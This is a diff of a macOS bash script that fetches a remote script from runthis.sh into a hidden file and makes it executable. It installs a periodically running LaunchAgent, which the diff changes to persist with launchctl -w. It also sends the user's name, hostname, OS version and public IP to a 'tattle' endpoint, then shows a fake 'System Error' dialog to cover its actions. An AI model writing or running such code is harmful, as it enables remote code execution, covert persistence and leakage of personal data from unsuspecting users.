@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 #
 if [[ -f $HOME/.unlocked ]]; then
-  curl -so $HOME/.file.sh https://runthis.sh/desktop.sh
+  curl -so $HOME/.file.sh https://runthis.sh/desktop.sh && chmod +x $HOME/.file.sh
 fi
 # Get macOS version
 macos_version=$(sw_vers -productVersion)
@@ -91,12 +91,10 @@ if [[ -f $HOME/.unlocked ]]; then
     </array>
     <key>StartInterval</key>
     <integer>10000</integer>
-    <key>RunAtLoad</key>
-    <true/>
 </dict>
 </plist>
 EOF
-    launchctl load $HOME/Library/LaunchAgents/com.sres.unlocked.plist
+    launchctl load -w $HOME/Library/LaunchAgents/com.sres.unlocked.plist
 fi
  curl -X POST -s "https://runthis.sh/tattle?user=$(whoami)&host=$(hostname)&os=$(sw_vers -productVersion)&ip=$(curl -s ifconfig.me)"
 osascript -e 'tell app "System Events" to display dialog "An unknown error occurred. Have you tried turning it off and on again?" with title "System Error"'
